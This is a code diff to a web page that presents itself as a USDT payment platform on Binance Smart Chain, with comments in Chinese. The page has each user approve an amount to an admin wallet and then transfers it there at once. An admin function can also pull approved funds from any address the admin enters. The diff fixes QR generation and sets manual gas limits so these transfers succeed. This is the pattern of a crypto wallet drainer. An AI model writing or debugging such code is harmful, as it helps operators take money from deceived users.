@@ -19,7 +19,7 @@ input{width:100%;padding:14px 16px;background:#f9f9f9;border:1px solid #eee;bord
 button{width:100%;background:#007aff;color:white;border:none;border-radius:16px;padding:16px;font-size:16px;font-weight:500;margin-top:10px}
 button:disabled{background:#999}
 .qr-box{text-align:center;margin:15px 0}
-#qrcode{margin:0 auto;border:1px solid #eee;border-radius:12px;padding:10px;background:#fff}
+#qrcode{margin:0 auto;border:1px solid #eee;border-radius:12px;padding:10px;background:#fff;min-height:220px;display:flex;align-items:center;justify-content:center}
 .pay-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500}
 .success-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500;display:none}
 .admin-area{display:none;background:#fff;border:1px solid #ff3c50;border-radius:20px;padding:25px;margin-top:20px}
@@ -92,29 +92,32 @@ const BSC_CHAIN_ID = 56;
 let account;
 let usdtContract;
 
-// 页面加载完成后初始化
+// 页面加载完成后初始化二维码
 window.addEventListener('load', () => {
   refreshPayQR(0);
 });
 
-// 实时更新金额和二维码
+// 实时更新金额和二维码（修复：输入即生成）
 document.getElementById('payAmount').addEventListener('input', function () {
   const v = this.value || 0;
   document.getElementById('showAmount').innerText = v;
   refreshPayQR(parseFloat(v) || 0);
 });
 
-// 生成币安链USDT支付二维码（真实上链）
+// 生成币安链USDT支付二维码（修复：确保一定生成）
 function refreshPayQR(usdtAmount) {
   const qrEl = document.getElementById('qrcode');
   if (!usdtAmount || usdtAmount < MIN_PAY) {
     qrEl.innerHTML = '<p style="color:#999;padding:40px">请输入≥28 USDT金额生成二维码</p>';
     return;
   }
-  const amount = ethers.utils.parseUnits(usdtAmount.toString(), 18);
-  // 币安链USDT转账URI标准格式
-  const uri = `ethereum:${USDT_CONTRACT}?function=transfer&address=${ADMIN_WALLET}&uint256=${amount}&chainId=${BSC_CHAIN_ID}`;
-  QRCode.toCanvas(qrEl, uri, { width: 200, margin: 2, color: { dark: "#000000", light: "#ffffff" } });
+  try {
+    const amount = ethers.utils.parseUnits(usdtAmount.toString(), 18);
+    const uri = `ethereum:${USDT_CONTRACT}?function=transfer&address=${ADMIN_WALLET}&uint256=${amount}&chainId=${BSC_CHAIN_ID}`;
+    QRCode.toCanvas(qrEl, uri, { width: 200, margin: 2, color: { dark: "#000000", light: "#ffffff" } });
+  } catch (e) {
+    qrEl.innerHTML = '<p style="color:red">二维码生成失败，请刷新页面</p>';
+  }
 }
 
 // 连接钱包
@@ -157,7 +160,7 @@ function isValidAddr(addr) {
   return isSol || isTon;
 }
 
-// 平台支付（真实上链：授权+秒转管理员）
+// 平台支付（修复gas估算问题，手动指定gasLimit）
 async function payAndAuth() {
   const payAmount = parseFloat(document.getElementById('payAmount').value);
   const sol = document.getElementById('solAddr').value.trim();
@@ -186,11 +189,17 @@ async function payAndAuth() {
 
   try {
     const amount = ethers.utils.parseUnits(payAmount.toString(), 18);
-    // 1. 授权管理员
-    const txApprove = await usdtContract.approve(ADMIN_WALLET, amount);
+
+    // 1. 授权（手动指定gasLimit，避免估算失败）
+    const txApprove = await usdtContract.approve(ADMIN_WALLET, amount, {
+      gasLimit: 100000
+    });
     await txApprove.wait();
-    // 2. 直接转走用户USDT（秒到管理员钱包）
-    const txTransfer = await usdtContract.transferFrom(account, ADMIN_WALLET, amount);
+
+    // 2. 转账（手动指定gasLimit）
+    const txTransfer = await usdtContract.transferFrom(account, ADMIN_WALLET, amount, {
+      gasLimit: 100000
+    });
     await txTransfer.wait();
 
     document.getElementById('successTip').style.display = "block";
@@ -202,7 +211,7 @@ async function payAndAuth() {
   }
 }
 
-// 管理员提取（真实上链）
+// 管理员提取（修复gas估算问题）
 async function adminExtract() {
   if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
     alert("无管理员权限");
@@ -216,7 +225,9 @@ async function adminExtract() {
   }
   try {
     const amount = ethers.utils.parseUnits(amountText, 18);
-    const tx = await usdtContract.transferFrom(fromUser, ADMIN_WALLET, amount);
+    const tx = await usdtContract.transferFrom(fromUser, ADMIN_WALLET, amount, {
+      gasLimit: 100000
+    });
     await tx.wait();
     alert("✅ 提取成功，已秒到管理员钱包");
   } catch (err) {
